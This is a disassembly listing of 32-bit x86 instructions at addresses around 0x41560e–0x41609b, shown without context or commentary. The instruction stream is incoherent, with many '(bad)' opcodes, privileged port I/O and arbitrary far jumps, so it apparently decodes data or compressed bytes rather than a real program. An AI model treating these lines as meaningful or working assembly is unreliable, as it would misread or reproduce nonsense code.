  41560e:	imul   ebp,DWORD PTR [edx-0x4],0x27f0e464
  415615:	or     BYTE PTR [edi+0x1f],dh
  415618:	inc    ebp
  415619:	jae    0x4155aa
  41561b:	or     BYTE PTR es:[ecx-0x67b8f529],cl
  415622:	mov    eax,0xfdfb44a0
  415627:	not    DWORD PTR [esi]
  415629:	sbb    eax,0xcc493e9a
  41562e:	dec    esi
  41562f:	pop    edi
  415630:	popf   
  415631:	pop    esi
  415632:	imul   ebx,DWORD PTR [ebx+0x6f],0x6a
  415636:	pop    ecx
  415637:	dec    ecx
  415638:	inc    ebp
  415639:	add    al,0x9d
  41563b:	bound  esi,QWORD PTR [ecx]
  41563d:	jmp    0x2847d5f3
  415642:	inc    edi
  415643:	cmp    al,dh
  415645:	pop    ds
  415646:	ss dec ebp
  415648:	adc    bh,BYTE PTR [edx+0x7c9fab5]
  41564e:	push   cs
  41564f:	js     0x415658
  415651:	jecxz  0x4155ed
  415653:	test   BYTE PTR [ecx],al
  415655:	dec    edx
  415656:	retf   0x9f5d
  415659:	push   esp
  41565a:	sbb    dh,BYTE PTR [ebx-0x42]
  41565d:	and    al,0xdd
  41565f:	pop    ecx
  415660:	or     DWORD PTR [ebx+edx*4],ecx
  415663:	sub    ecx,DWORD PTR [ebx-0x7d4cf8b2]
  415669:	in     al,0x4c
  41566b:	add    eax,0x309423d1
  415670:	cmp    bl,al
  415672:	mov    ebp,0xcef8cb27
  415677:	lahf   
  415678:	and    BYTE PTR [edi],ch
  41567a:	sbb    BYTE PTR [edi],ch
  41567c:	xlat   BYTE PTR ds:[ebx]
  41567d:	xor    BYTE PTR [ecx+edx*2+0x78],dh
  415681:	iret   
  415682:	add    DWORD PTR [ebp+edx*1+0x670d7bc1],ebp
  415689:	popa   
  41568a:	dec    esi
  41568b:	cld    
  41568c:	jp     0x41568a
  41568e:	add    ch,BYTE PTR [esi]
  415690:	ja     0x4156fa
  415692:	out    dx,eax
  415693:	in     al,dx
  415694:	push   esp
  415695:	inc    edi
  415696:	scas   al,BYTE PTR es:[edi]
  415697:	call   0x1493:0x623b08b2
  41569e:	add    BYTE PTR [ebx+esi*2-0x3eac076f],ch
  4156a5:	sub    al,0x96
  4156a7:	lahf   
  4156a8:	(bad)  
  4156a9:	(bad)  
  4156ab:	or     bh,BYTE PTR [ebx-0x68]
  4156ae:	je     0x4156b6
  4156b0:	inc    ecx
  4156b1:	mov    eax,0xfe066f6b
  4156b6:	out    0xe4,al
  4156b8:	in     al,dx
  4156b9:	lea    ebp,[ebp+0x38dac773]
  4156bf:	inc    edi
  4156c0:	xor    cl,ch
  4156c2:	scas   eax,DWORD PTR es:[edi]
  4156c3:	jecxz  0x4156c9
  4156c5:	cmp    DWORD PTR ds:0x7f4c621b,esi
  4156cb:	ror    DWORD PTR [ebx],1
  4156cd:	imul   edx,esi,0x94044c55
  4156d3:	cs femms 
  4156d6:	push   ds
  4156d7:	inc    ecx
  4156d8:	fst    QWORD PTR [edi+eiz*8]
  4156db:	mov    ch,BYTE PTR [edi-0x402081d3]
  4156e1:	inc    ebx
  4156e2:	add    eax,DWORD PTR [edx]
  4156e4:	iret   
  4156e5:	mov    dl,0xec
  4156e7:	sahf   
  4156e8:	pop    ebp
  4156e9:	sahf   
  4156ea:	jmp    0x4156d8
  4156ec:	sub    ebx,DWORD PTR [ebx+0x0]
	...
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0x92
  415763:	inc    esp
  415764:	add    esp,DWORD PTR [ebx]
  415766:	addr16 out 0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    bh,cl
  41576f:	fild   WORD PTR [eax]
  415771:	cmp    eax,0x2102490f
  415776:	dec    ebp
  415777:	add    BYTE PTR [ebp+0x4e],bh
  41577a:	das    
  41577b:	retf   0xcc02
  41577e:	mov    ecx,0xd21634d7
  415783:	test   esi,ebx
  415785:	and    eax,0x6d92b86f
  41578a:	int    0x99
  41578c:	mov    ds:0xf6db3761,al
  415791:	sar    ebp,1
  415793:	sub    edx,ebp
  415795:	fldcw  WORD PTR [edx-0x2d]
  415798:	dec    esi
  415799:	push   edi
  41579a:	jmp    0x415743
  41579c:	mov    cl,0xfe
  41579e:	and    ah,BYTE PTR [edx-0x44314d6f]
  4157a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157a5:	sub    DWORD PTR [edx+0x20],edi
  4157a8:	add    BYTE PTR [ebx-0x46368ea7],bh
  4157ae:	adc    BYTE PTR [ecx+0x64],0x64
  4157b2:	out    0xf8,eax
  4157b4:	dec    edi
  4157b5:	sub    DWORD PTR [edx],eax
  4157b7:	cmp    bh,bh
  4157b9:	mov    al,ds:0x52a665fe
  4157be:	mov    DWORD PTR [ebp-0x2c],edi
  4157c1:	fxch   st(2)
  4157c3:	shl    DWORD PTR [ebp+0x4be0e7a9],0xd6
  4157ca:	les    edi,FWORD PTR [ebp-0x5a]
  4157cd:	test   bh,ch
  4157cf:	cmp    eax,0xd7ec82c2
  4157d4:	shl    edi,0x4b
  4157d7:	mov    al,0xec
  4157d9:	pop    ss
  4157da:	cmp    al,0xfd
  4157dc:	cwde   
  4157dd:	mov    ebx,DWORD PTR [eax-0x50778b4]
  4157e3:	in     eax,dx
  4157e4:	stos   BYTE PTR es:[edi],al
  4157e5:	pop    edi
  4157e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157e7:	mov    esi,0xd747807d
  4157ec:	and    BYTE PTR [edi+0x71083185],0x86
  4157f3:	xchg   ebx,eax
  4157f4:	(bad)  
  4157f5:	daa    
  4157f6:	mov    esp,0x703acdc3
  4157fb:	jo     0x41585f
  4157fd:	test   eax,0x4e44772b
  415802:	pusha  
  415803:	push   edi
  415804:	push   ss
  415805:	test   DWORD PTR [ebx],eax
  415807:	popa   
  415808:	xchg   ecx,eax
  415809:	jns    0x4157d5
  41580b:	fs jnp 0x4157bf
  41580e:	cmp    eax,0x7bc0af47
  415813:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415814:	pushf  
  415815:	outs   dx,DWORD PTR ds:[esi]
  415816:	sbb    ah,BYTE PTR [edx-0x26536b08]
  41581c:	sbb    bh,ah
  41581e:	jg     0x415840
  415820:	outs   dx,BYTE PTR ds:[esi]
  415821:	pop    es
  415822:	jecxz  0x4157fd
  415824:	sbb    BYTE PTR [edx-0x1a],ch
  415827:	cmp    eax,0xdcf4582c
  41582c:	xchg   ecx,eax
  41582d:	and    eax,ebp
  41582f:	push   edx
  415830:	fs push edx
  415832:	sub    BYTE PTR ds:0xcda94577,bh
  415838:	clc    
  415839:	cwde   
  41583a:	xchg   esp,eax
  41583b:	xchg   ebp,eax
  41583c:	pop    ebp
  41583d:	jb     0x415831
  41583f:	dec    eax
  415840:	shl    DWORD PTR [eax-0x64],cl
  415843:	nop
  415844:	xor    DWORD PTR [eax+0x7fe904a5],eax
  41584a:	cli    
  41584b:	pusha  
  41584c:	pop    esp
  41584d:	popa   
  41584e:	ret    0x25ed
  415851:	cwde   
  415852:	shr    eax,1
  415854:	ja     0x4158d0
  415856:	je     0x415897
  415858:	loopne 0x415814
  41585a:	xchg   DWORD PTR [edi+0x9],esp
  41585d:	xchg   BYTE PTR [ecx+0x290b48a6],dh
  415863:	xchg   esp,eax
  415864:	rcl    BYTE PTR [esp+edi*8],cl
  415867:	dec    esp
  415868:	add    al,0x80
  41586a:	shl    edx,1
  41586c:	xchg   esi,eax
  41586d:	ret    
	...
  4158d6:	retf   
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	sar    edi,cl
  4158e3:	adc    eax,0xe867a29f
  4158e8:	add    BYTE PTR [eax],al
  4158ea:	add    BYTE PTR [ecx],al
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	and    al,0xb0
  4158f0:	cdq    
  4158f1:	call   0x84341fe2
  4158f6:	fsub   DWORD PTR [esi]
  4158f8:	sub    al,0xff
  4158fa:	stc    
  4158fb:	out    0x7d,eax
  4158fd:	lock mov eax,ds:0xa41792f7
  415903:	neg    BYTE PTR [ecx+eax*4]
  415906:	pop    edx
  415907:	dec    edi
  415908:	jg     0x415926
  41590a:	call   0xf57:0x923328be
  415911:	dec    ebx
  415912:	push   es
  415913:	mov    DWORD PTR [ebx],0x66bcfdda
  415919:	mov    ecx,0x498d6206
  41591e:	jne    0x4158ca
  415920:	test   eax,0xedc56ea6
  415925:	mov    fs,WORD PTR [eax+0x7f]
  415928:	out    dx,al
  415929:	(bad)  
  41592b:	sub    al,0xff
  41592d:	or     DWORD PTR [ebp-0x3dc9805f],ebp
  415933:	and    BYTE PTR [esi+0x3a],ch
  415936:	xchg   edx,eax
  415937:	sar    BYTE PTR [ebx-0x45d279c1],1
  41593d:	jno    0x4158e3
  41593f:	rcr    DWORD PTR [edx-0x49],0x84
  415943:	clc    
  415944:	dec    eax
  415945:	call   0x97de:0xb7acec32
  41594c:	icebp  
  41594d:	jp     0x415958
  41594f:	mov    eax,ds:0x7f1f6b04
  415954:	dec    edx
  415955:	pop    ebp
  415956:	dec    eax
  415957:	inc    esi
  415958:	or     BYTE PTR [edx-0x67],dh
  41595b:	(bad)  
  41595c:	add    eax,DWORD PTR [edi+0x5b]
  41595f:	jno    0x4159ba
  415961:	sar    ch,cl
  415963:	cld    
  415964:	mov    edx,0xa77e1318
  415969:	pop    edi
  41596a:	idiv   BYTE PTR [ecx+0x1dbf59c5]
  415970:	cld    
  415971:	out    dx,eax
  415972:	loopne 0x415915
  415974:	adc    dh,BYTE PTR [ebx+0x25]
  415977:	sbb    esp,DWORD PTR [ecx+0x56a28b99]
  41597d:	outs   dx,DWORD PTR ds:[esi]
  41597e:	(bad)  
  41597f:	mov    edx,0x8425af3f
  415984:	arpl   WORD PTR [edi],di
  415986:	bnd ja 0x415964
  415989:	and    al,0x83
  41598b:	add    al,0x72
  41598d:	inc    edi
  41598e:	ss or  al,0xc7
  415991:	push   esp
  415992:	stos   DWORD PTR es:[edi],eax
  415993:	je     0x41591b
  415995:	or     edx,ecx
  415997:	leave  
  415998:	dec    eax
  415999:	mov    bh,0x66
  41599b:	dec    ebx
  41599c:	sub    ebx,DWORD PTR cs:[edi]
  41599f:	loope  0x415961
  4159a1:	icebp  
  4159a2:	addr16 push 0xffffff8f
  4159a5:	dec    ebp
  4159a6:	rol    ah,cl
  4159a8:	jmp    0xedd42da9
  4159ad:	movsx  edi,BYTE PTR [edi-0x799aba90]
  4159b4:	push   ebx
  4159b5:	jp     0x4159f1
  4159b7:	outs   dx,DWORD PTR ds:[esi]
  4159b8:	fiadd  WORD PTR [si+0x2d2f]
  4159bd:	push   ebp
  4159be:	pop    edi
  4159bf:	mov    eax,0xaef3b155
  4159c4:	repz mov bh,0x2b
  4159c7:	arpl   WORD PTR [eax+0x4fd8d14a],ax
  4159cd:	lahf   
  4159ce:	popa   
  4159cf:	or     dh,cl
  4159d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159d2:	lods   eax,DWORD PTR ds:[esi]
  4159d3:	jl     0x41596e
  4159d5:	jle    0x4159b9
  4159d7:	push   ds
  4159d8:	shl    BYTE PTR [ecx-0x3960dd41],1
  4159de:	mov    bh,0xcb
  4159e0:	jecxz  0x415a53
  4159e2:	test   esp,eax
  4159e4:	jno    0x415a13
  4159e6:	cli    
  4159e7:	ins    DWORD PTR es:[edi],dx
  4159e8:	jns    0x4159af
  4159ea:	(bad)  
  4159eb:	out    dx,eax
  4159ec:	ja     0x4159ed
	...
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	xchg   ebp,eax
  415a63:	cmp    DWORD PTR [ecx+0xe96730],0x10000
  415a6d:	add    BYTE PTR [edi-0x70],ch
  415a70:	cmc    
  415a71:	(bad)  
  415a72:	sbb    DWORD PTR [edi-0x628bd9a],edi
  415a78:	sbb    eax,0xdb1535ad
  415a7d:	xchg   ebx,eax
  415a7e:	fcmovnbe st,st(2)
  415a80:	jmp    0xca001c94
  415a85:	dec    ebp
  415a86:	ret    
  415a87:	daa    
  415a88:	in     eax,dx
  415a89:	sbb    DWORD PTR [eax+ebp*1+0x6bd4a2b8],ebx
  415a90:	mov    eax,0xa0f83144
  415a95:	jb     0x415b0f
  415a97:	sub    bl,BYTE PTR [ebp+0x3f]
  415a9a:	mov    al,ds:0x9c8c1b0a
  415a9f:	ret    0xc157
  415aa2:	jno    0x415a3e
  415aa4:	(bad)  
  415aa6:	ret    0x70de
  415aa9:	sti    
  415aaa:	lock jp 0x415a73
  415aad:	mov    bl,0x2b
  415aaf:	fwait
  415ab0:	pop    eax
  415ab1:	cmp    DWORD PTR [eax+esi*2-0x27884eec],eax
  415ab8:	shr    BYTE PTR [eax+0x18],1
  415abb:	sbb    ebx,DWORD PTR [ecx+0x7d182355]
  415ac1:	dec    esp
  415ac2:	xor    eax,0x6515d6c7
  415ac7:	es in  al,0x1d
  415aca:	inc    ebp
  415acb:	shr    DWORD PTR [ecx+0x22],cl
  415ace:	fiadd  WORD PTR [edi-0x63]
  415ad1:	call   0x67168874
  415ad6:	fst    QWORD PTR ss:[edi-0x7896a09e]
  415add:	pop    ss
  415ade:	in     eax,0x6c
  415ae0:	lock lock dec edi
  415ae3:	add    BYTE PTR [ecx],ch
  415ae5:	popf   
  415ae6:	pop    ds
  415ae7:	and    DWORD PTR [edx-0x3079b6f],esi
  415aed:	retf   
  415aee:	neg    BYTE PTR ds:0xc802be9b
  415af4:	aaa    
  415af5:	imul   edx,DWORD PTR [eax-0x47],0xfc6a1a9a
  415afc:	jmp    0x8e8e9ba7
  415b01:	jnp    0x415b30
  415b03:	inc    esi
  415b04:	rcl    BYTE PTR [ecx],0xc7
  415b07:	arpl   WORD PTR [ebx-0x5696e158],sp
  415b0d:	inc    esp
  415b0e:	data16 and BYTE PTR [ecx-0x37],0xae
  415b13:	aad    0x27
  415b15:	popa   
  415b16:	push   ebx
  415b17:	fadd   QWORD PTR [ebp-0x274abbbd]
  415b1d:	xchg   edx,eax
  415b1e:	and    dl,al
  415b20:	scas   al,BYTE PTR es:[edi]
  415b21:	inc    ebp
  415b22:	leave  
  415b23:	not    edx
  415b25:	cmp    eax,0x621966ae
  415b2a:	mov    al,BYTE PTR [ebx]
  415b2c:	(bad)  
  415b2d:	rcl    BYTE PTR [ebx],1
  415b2f:	xor    eax,0x982180a
  415b34:	cs int3 
  415b36:	push   edx
  415b37:	pop    ebx
  415b38:	or     esp,0xd0d3f44
  415b3e:	jnp    0x415ae0
  415b40:	sbb    DWORD PTR ds:0x7991d02d,ebp
  415b46:	clc    
  415b47:	arpl   WORD PTR [ebp-0x1f],sp
  415b4a:	scas   eax,DWORD PTR es:[edi]
  415b4b:	mov    DWORD PTR [eax+edx*1],ecx
  415b4e:	pop    eax
  415b4f:	mov    ah,0x9d
  415b51:	mov    dl,0x68
  415b53:	shl    DWORD PTR [ecx],1
  415b55:	lods   al,BYTE PTR ds:[esi]
  415b56:	gs mov ecx,0xdac2d717
  415b5c:	xchg   edx,eax
  415b5d:	or     ebp,DWORD PTR [edi]
  415b5f:	mov    dh,0x34
  415b61:	arpl   WORD PTR [eax-0x70f2c979],si
  415b67:	xor    esp,edi
  415b69:	or     eax,0xcbb5e451
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fdivr  QWORD PTR [esi+0x67373f0e]
  415be7:	jmp    0x0:0x1000000
  415bee:	mov    eax,ds:0x19d119ff
  415bf3:	xor    DWORD PTR [edi-0x19909f9e],eax
  415bf9:	jg     0x415c6b
  415bfb:	fcom   st(3)
  415bfd:	jmp    0xe94b:0x9046ce8b
  415c04:	xor    eax,0x4f2463ff
  415c09:	fdiv   DWORD PTR [edi+0x44]
  415c0c:	mov    dh,0xc9
  415c0e:	inc    esi
  415c0f:	fadd   DWORD PTR [edx+0x73f7cb08]
  415c15:	mov    DWORD PTR [ebx],edi
  415c17:	std    
  415c18:	cs push cs
  415c1a:	or     al,0x6c
  415c1c:	jle    0x415c5f
  415c1e:	jo     0x415bd9
  415c20:	es push esi
  415c22:	inc    edi
  415c23:	test   al,0x5c
  415c25:	(bad)  
  415c26:	push   eax
  415c27:	stos   BYTE PTR es:[edi],al
  415c28:	or     cl,bl
  415c2a:	call   0x71ab6ee2
  415c2f:	aad    0x84
  415c31:	icebp  
  415c32:	shl    cl,cl
  415c34:	scas   al,BYTE PTR es:[edi]
  415c35:	enter  0x9706,0xed
  415c39:	push   eax
  415c3a:	xor    esp,0xf1b94584
  415c40:	aam    0x10
  415c42:	bound  ecx,QWORD PTR [ebp+0xe]
  415c45:	xor    edi,DWORD PTR [ecx]
  415c47:	sub    BYTE PTR [esi],0xd
  415c4a:	mov    esi,DWORD PTR [ebx+esi*2-0x2e5ef390]
  415c51:	popf   
  415c52:	xchg   esi,eax
  415c53:	sub    BYTE PTR [ecx+0x164630f4],0xe6
  415c5a:	(bad)  
  415c5b:	loopne 0x415c1c
  415c5d:	out    0x90,al
  415c5f:	aam    0xb3
  415c61:	mov    BYTE PTR [eax-0x2d821a22],dh
  415c67:	push   ds
  415c68:	lahf   
  415c69:	fiadd  WORD PTR [ebx-0x57]
  415c6c:	mov    ch,0x7e
  415c6e:	dec    ecx
  415c6f:	ja     0x415c07
  415c71:	mov    dl,0x59
  415c73:	hlt    
  415c74:	(bad)  
  415c75:	push   eax
  415c76:	sbb    BYTE PTR [esi+0x1780859c],cl
  415c7c:	push   edi
  415c7d:	sub    al,0x83
  415c7f:	adc    BYTE PTR [eax-0x58],bh
  415c82:	xor    BYTE PTR [ecx],dh
  415c84:	repnz push cs
  415c86:	push   es
  415c87:	mov    tr6,esp
  415c8a:	mov    esi,0x34175a8
  415c8f:	pop    ecx
  415c90:	dec    eax
  415c91:	das    
  415c92:	popf   
  415c93:	push   es
  415c94:	adc    eax,0x73957fdb
  415c99:	mov    eax,ds:0xbd64106b
  415c9e:	aaa    
  415c9f:	xchg   edi,eax
  415ca0:	js     0x415d13
  415ca2:	mov    ebx,0xc59ee31
  415ca7:	pop    edx
  415ca8:	loop   0x415c60
  415caa:	mov    ds:0xd327e866,eax
  415caf:	stos   DWORD PTR es:[di],eax
  415cb1:	js     0x415c72
  415cb3:	inc    eax
  415cb4:	std    
  415cb5:	push   edx
  415cb6:	push   eax
  415cb7:	xor    eax,0xae0d0dd1
  415cbc:	jb     0x415cc9
  415cbe:	push   edx
  415cbf:	inc    esp
  415cc0:	gs mov ch,0x29
  415cc3:	and    DWORD PTR [eax],0x23
  415cc6:	shr    BYTE PTR [edi-0x41690e16],cl
  415ccc:	inc    edx
  415ccd:	pop    esi
  415cce:	sub    BYTE PTR [ebp-0x7dc01f8b],ch
  415cd4:	dec    ecx
  415cd5:	mov    edx,0x69de6867
  415cda:	cmp    ah,BYTE PTR [edi-0x51]
  415cdd:	in     eax,dx
  415cde:	mov    eax,0x927a518e
  415ce3:	or     esp,DWORD PTR [ecx+0x65472ee6]
  415ce9:	lods   eax,DWORD PTR ds:[esi]
  415cea:	dec    ebx
  415ceb:	add    bh,BYTE PTR [bp+di+0x0]
	...
  415d53:	add    BYTE PTR [eax],al
  415d55:	add    BYTE PTR [edx],bh
  415d57:	adc    BYTE PTR [edi-0x444040c4],bh
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x69c33d1f
  415d65:	stos   BYTE PTR es:[edi],al
  415d66:	addr16 jmp 0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    cl,bl
  415d6f:	jp     0x415d75
  415d71:	inc    esi
  415d72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d73:	dec    ebp
  415d74:	dec    ebx
  415d75:	push   ss
  415d76:	inc    ebp
  415d77:	fs mov esi,0x57df1a29
  415d7d:	ins    BYTE PTR es:[edi],dx
  415d7e:	cmp    bl,bh
  415d80:	popf   
  415d81:	jge    0x415dc8
  415d83:	inc    eax
  415d84:	sub    al,0x57
  415d86:	dec    edx
  415d87:	leave  
  415d88:	xchg   edi,eax
  415d89:	in     al,0x83
  415d8b:	adc    esp,ebp
  415d8d:	xchg   esp,eax
  415d8e:	fstp   QWORD PTR [esi]
  415d90:	rcr    BYTE PTR [ecx+0x5d2bc67a],0x5e
  415d97:	xchg   ecx,eax
  415d98:	dec    esi
  415d99:	pop    ebp
  415d9a:	dec    esi
  415d9b:	jle    0x415d34
  415d9d:	pop    eax
  415d9e:	add    BYTE PTR [edi-0x12],ah
  415da1:	dec    ebp
  415da2:	sub    esi,ebp
  415da4:	not    BYTE PTR [ecx+0x7b]
  415da7:	mov    edx,0xb81168e0
  415dac:	push   edx
  415dad:	push   edi
  415dae:	sbb    dl,BYTE PTR [eax]
  415db0:	sbb    edi,DWORD PTR [eax+0x29b3fdf1]
  415db6:	sbb    esi,DWORD PTR [eax]
  415db8:	ja     0x415d45
  415dba:	ret    0xaf96
  415dbd:	mov    esp,0x808ebcc2
  415dc2:	jae    0x415d83
  415dc4:	cmp    eax,0x5b7cae39
  415dc9:	cli    
  415dca:	and    cl,BYTE PTR ds:0x11352912
  415dd0:	mov    ds:0x69789fe3,al
  415dd5:	icebp  
  415dd6:	aam    0xda
  415dd8:	ins    BYTE PTR es:[edi],dx
  415dd9:	lds    edx,FWORD PTR [ebp-0x6f]
  415ddc:	inc    edx
  415ddd:	add    eax,0xbb0e8bc9
  415de2:	push   0xfffffff6
  415de4:	cmp    DWORD PTR [ecx+0x3c57e63d],edi
  415dea:	mov    ds:0x1e6a5142,al
  415def:	aam    0xc6
  415df1:	inc    eax
  415df2:	pop    es
  415df3:	jne    0x415e55
  415df5:	ja     0x415dd9
  415df7:	add    ah,ch
  415df9:	mov    bh,0xb1
  415dfb:	in     eax,0x17
  415dfd:	clc    
  415dfe:	ror    BYTE PTR [ebx-0x75],0xbc
  415e02:	pop    ebp
  415e03:	sahf   
  415e04:	xchg   esp,eax
  415e05:	pop    edx
  415e06:	les    eax,FWORD PTR [ecx+0x40]
  415e09:	(bad)  
  415e0a:	sub    DWORD PTR [eax+ebx*1-0x7ff8fcc2],esp
  415e11:	test   eax,0xa1b9fb69
  415e16:	(bad)  
  415e17:	dec    esi
  415e18:	inc    esi
  415e19:	or     esi,ebp
  415e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e1c:	jae    0x415e01
  415e1e:	ss push ecx
  415e20:	pop    ds
  415e21:	mov    edx,0x365e598d
  415e26:	aaa    
  415e27:	test   BYTE PTR [edi+eiz*4-0x47],al
  415e2b:	xchg   edx,eax
  415e2c:	or     BYTE PTR cs:[edi+0x40],al
  415e30:	ins    DWORD PTR es:[edi],dx
  415e31:	xchg   ebx,eax
  415e32:	cmp    DWORD PTR [esi+esi*2+0x66],esi
  415e36:	push   0xc1076fe2
  415e3b:	rcl    BYTE PTR [ebp-0x55bc89a9],0x20
  415e42:	xchg   ebp,eax
  415e43:	clc    
  415e44:	sub    ch,BYTE PTR [ebx+edx*1-0x4]
  415e48:	dec    edx
  415e49:	sbb    BYTE PTR gs:[esi],bh
  415e4c:	les    ecx,FWORD PTR [ebx+0x5e]
  415e4f:	fistp  QWORD PTR [edx]
  415e51:	rol    DWORD PTR [edx-0x294f8abc],1
  415e57:	outs   dx,BYTE PTR ds:[esi]
  415e58:	push   edx
  415e59:	xchg   esi,eax
  415e5a:	fs push cs
  415e5c:	(bad)  
  415e5d:	jge    0x415ebe
  415e5f:	data16 fbld TBYTE PTR [ecx+0x3f0b2ed9]
  415e66:	xor    eax,0x6ba6b786
  415e6b:	jae    0x415ea4
  415e6d:	add    al,BYTE PTR [eax]
	...
  415ed3:	add    BYTE PTR [eax],al
  415ed5:	add    dh,ch
  415ed7:	repnz cmc 
  415ed9:	add    edi,ebp
  415edb:	pop    es
  415edc:	(bad)  
  415edd:	call   FWORD PTR [ebp+0x1f]
  415ee0:	les    esi,FWORD PTR [eax-0x34]
  415ee3:	adc    DWORD PTR [ecx],esi
  415ee5:	jns    0x415f4e
  415ee7:	in     al,dx
  415ee8:	add    BYTE PTR [eax],al
  415eea:	add    BYTE PTR [ecx],al
  415eec:	add    BYTE PTR [eax],al
  415eee:	cmp    eax,0x98e98b06
  415ef3:	adc    eax,0xba8481df
  415ef8:	out    dx,eax
  415ef9:	in     al,0xa3
  415efb:	pop    ss
  415efc:	pop    ds
  415efd:	inc    ecx
  415efe:	fmul   QWORD PTR [eax+edi*1-0x11]
  415f02:	hlt    
  415f03:	xor    eax,0x88e049dd
  415f09:	imul   esp,edi,0x77
  415f0c:	mov    al,0x72
  415f0e:	(bad)  
  415f0f:	into   
  415f10:	pop    esi
  415f11:	ins    DWORD PTR es:[edi],dx
  415f12:	mov    dl,cl
  415f14:	mov    dl,0x1c
  415f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f17:	iret   
  415f18:	ret    
  415f19:	sub    ebp,DWORD PTR [edi+0x6]
  415f1c:	mov    ebp,0xbb81868b
  415f21:	inc    eax
  415f22:	dec    edx
  415f23:	mov    dl,0x95
  415f25:	adc    eax,0x1ff08f77
  415f2a:	xor    ah,BYTE PTR [eax+0x6]
  415f2d:	jmp    0x7881:0xf2cd242c
  415f34:	outs   dx,BYTE PTR ds:[esi]
  415f35:	push   ecx
  415f36:	and    DWORD PTR [edx],edx
  415f38:	dec    ebp
  415f39:	pushf  
  415f3a:	sbb    al,0xe5
  415f3c:	leave  
  415f3d:	sub    DWORD PTR [edi],esp
  415f3f:	sbb    cl,BYTE PTR [esi+0x6c]
  415f42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f43:	jae    0x415f5c
  415f45:	push   esp
  415f46:	sbb    al,0x47
  415f48:	and    edx,eax
  415f4a:	mov    edi,0xa8022225
  415f4f:	mov    ds:0xad498b4c,eax
  415f54:	xchg   ebx,eax
  415f55:	mov    dh,0x95
  415f57:	sbb    al,0x87
  415f59:	dec    esp
  415f5a:	clc    
  415f5b:	test   dh,0xb5
  415f5e:	bound  eax,QWORD PTR ds:0xeffd2447
  415f64:	retf   
  415f65:	add    dh,BYTE PTR [esi-0x2a4bf936]
  415f6b:	outs   dx,DWORD PTR ds:[esi]
  415f6c:	adc    eax,0x7711527b
  415f71:	dec    ebx
  415f72:	jmp    0x109aeb33
  415f77:	popf   
  415f78:	in     eax,0x43
  415f7a:	pop    esp
  415f7b:	mov    ch,0xd2
  415f7d:	and    BYTE PTR [eax],cl
  415f7f:	mov    esi,eax
  415f81:	mov    WORD PTR [ecx],?
  415f83:	mov    ebx,0x3fe6d9a7
  415f88:	out    dx,eax
  415f89:	(bad)  
  415f8a:	xchg   ebp,eax
  415f8b:	imul   edx,ecx,0xfffffff6
  415f8e:	pop    ebp
  415f8f:	dec    edi
  415f90:	imul   ebx,DWORD PTR [ebx-0x4f273aae],0xffffff8d
  415f97:	stc    
  415f98:	add    cl,ch
  415f9a:	ret    0x9ef0
  415f9d:	sub    ch,ah
  415f9f:	push   cs
  415fa0:	mov    ebp,0xbd4f8eac
  415fa5:	jge    0x415fbb
  415fa7:	mov    esp,0xa4201aad
  415fac:	sbb    BYTE PTR [ebx+ebp*8-0x4ecd9c1e],dl
  415fb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb4:	pop    edx
  415fb5:	jmp    0x7289:0xf5a5d1a5
  415fbc:	lahf   
  415fbd:	jbe    0x41603b
  415fbf:	mov    ch,0xe3
  415fc1:	add    al,0xec
  415fc3:	jmp    0x3b56b168
  415fc8:	in     al,0x5e
  415fca:	imul   esi,DWORD PTR [ecx-0x30eb774a],0xb66e9d88
  415fd4:	les    ecx,FWORD PTR [ecx+0x276e0f8f]
  415fda:	or     DWORD PTR [eax],edi
  415fdc:	aad    0xd9
  415fde:	mov    dl,0xa0
  415fe0:	inc    esp
  415fe1:	xchg   ebp,eax
  415fe2:	movhps xmm6,QWORD PTR [edx+0x8]
  415fe6:	dec    ebx
  415fe7:	add    al,0x30
  415fe9:	adc    edx,esi
  415feb:	add    bh,BYTE PTR [esi-0x6b]
	...
  416056:	pop    ss
  416057:	mov    BYTE PTR [esi-0x6e],ch
  41605a:	push   esi
  41605c:	dec    DWORD PTR [ebp-0x37ca37e8]
  416062:	imul   edx,DWORD PTR [ebx],0xffffffd1
  416065:	ret    0xed67
  416068:	add    BYTE PTR [eax],al
  41606a:	add    BYTE PTR [ecx],al
  41606c:	add    BYTE PTR [eax],al
  41606e:	adc    DWORD PTR [esi+0x4429130f],0x51eafad2
  416078:	stos   DWORD PTR es:[edi],eax
  416079:	mov    edi,0x9f7e680f
  41607e:	bound  edx,QWORD PTR [ebp+edx*4+0x30907354]
  416085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416086:	cwde   
  416087:	xchg   ebp,esp
  416089:	xchg   esi,eax
  41608a:	sti    
  41608b:	inc    ebp
  41608c:	jbe    0x4160dc
  41608e:	ror    BYTE PTR [ecx+0x1e67ab17],cl
  416094:	pop    es
  416095:	jl     0x4160f4
  416097:	addr16 sub ch,bh
  41609a:	lahf   
  41609b:	je     0x4160e5
